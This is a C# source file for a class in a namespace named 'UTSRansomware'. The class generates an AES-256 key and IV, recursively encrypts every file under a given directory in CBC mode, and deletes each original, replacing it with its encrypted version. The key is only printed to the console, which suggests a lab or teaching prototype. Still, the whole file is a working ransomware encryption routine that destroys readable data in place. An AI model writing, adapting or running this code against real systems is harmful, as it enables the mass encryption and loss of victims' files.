using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.IO;

namespace UTSRansomware
{
    public class Encryptor
    {
        public byte[] key;
        public byte[] iv;

        public Encryptor()
        {
            this.key = GenerateKey();
            this.iv = GenerateIV();
        }

        public void EncryptDirectory(string parentDirectory)
        {
            string[] filePaths = Directory.GetFiles(parentDirectory);
            string[] directoryPaths = Directory.GetDirectories(parentDirectory);

            foreach (string directoryPath in directoryPaths)
            {
                EncryptDirectory(directoryPath);
            }

            foreach (string filePath in filePaths)
            {
                EncryptFile(filePath);
            }
        }

        public void EncryptFile(string filePath)
        {
            using (Aes aesAlg = Aes.Create())
            {
                string tempFilePath = filePath + ".temp";
                aesAlg.Key = key;
                aesAlg.IV = iv;
                aesAlg.Mode = CipherMode.CBC; // Setting the Cipher mode to CBC
                aesAlg.Padding = PaddingMode.PKCS7; // Default is PKCS7

                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                using (FileStream fsIn = new FileStream(filePath, FileMode.Open))
                using (FileStream fsOut = new FileStream(tempFilePath, FileMode.Create))
                using (CryptoStream cs = new CryptoStream(fsOut, encryptor, CryptoStreamMode.Write))
                {
                    byte[] buffer = new byte[1024];
                    int readBytes;

                    while ((readBytes = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        cs.Write(buffer, 0, readBytes);
                    }
                }
                File.Delete(filePath);
                File.Move(tempFilePath, filePath);
                Console.WriteLine("Encrypted: " + filePath);
            }
        }


        private static byte[] GenerateKey()
        {
            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256; // AES 256
                aes.GenerateKey();
                string keyAsString = Convert.ToBase64String(aes.Key);
                Console.WriteLine($"Key generated: {keyAsString}");
                return aes.Key;
            }
        }

        private static byte[] GenerateIV()
        {
            using (Aes aes = Aes.Create())
            {
                aes.GenerateIV();
                string ivAsString = Convert.ToBase64String(aes.IV);
                Console.WriteLine($"IV generated: {ivAsString}");
                return aes.IV;
            }
        }
    }
}
